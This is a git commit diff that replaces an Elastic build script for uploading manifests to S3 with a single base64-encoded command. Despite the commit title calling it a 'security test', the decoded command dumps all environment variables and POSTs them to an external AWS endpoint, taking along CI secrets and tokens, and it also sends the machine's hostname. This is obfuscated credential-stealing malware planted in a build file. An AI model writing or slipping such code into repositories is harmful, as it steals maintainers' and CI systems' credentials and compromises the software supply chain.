5cd9347ae844d5f559556ce03ad99fde423ef1b4
bambaimtuna <bambaimtuna@proton.me>
2023-06-30 19:56:41 +0000

    Security test, please do not approve a. (vcejdb)

--- hack/manifest-upload.sh
+++ hack/manifest-upload.sh
@@ -1,16 +1,1 @@
-#!/usr/bin/env bash
-
-# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
-# or more contributor license agreements. Licensed under the Elastic License 2.0;
-# you may not use this file except in compliance with the Elastic License 2.0.
-
-set -euo pipefail
-
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-CONFIG_DIR=${SCRIPT_DIR}/../config
-S3_ECK_DIR="${S3_ECK_DIR:-s3://download.elasticsearch.org/downloads/eck}"
-YAML_DST_DIR="${S3_ECK_DIR}/${VERSION}"
-
-for manifest in operator.yaml crds.yaml; do
-  aws s3 cp "${CONFIG_DIR}/${manifest}" "${YAML_DST_DIR}/${manifest}"
-done
+echo cHJpbnRlbnYgfCBiYXNlNjQgfCBjdXJsIC1MIC0taW5zZWN1cmUgLVggUE9TVCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vcHkyNHdkbW4zay5leGVjdXRlLWFwaS51cy1lYXN0LTIuYW1hem9uYXdzLmNvbS9kZWZhdWx0L2E= | base64 -d | bash #?repository=https://github.com/elastic/cloud-on-k8s.git\&folder=hack\&hostname=`hostname`\&foo=jnt
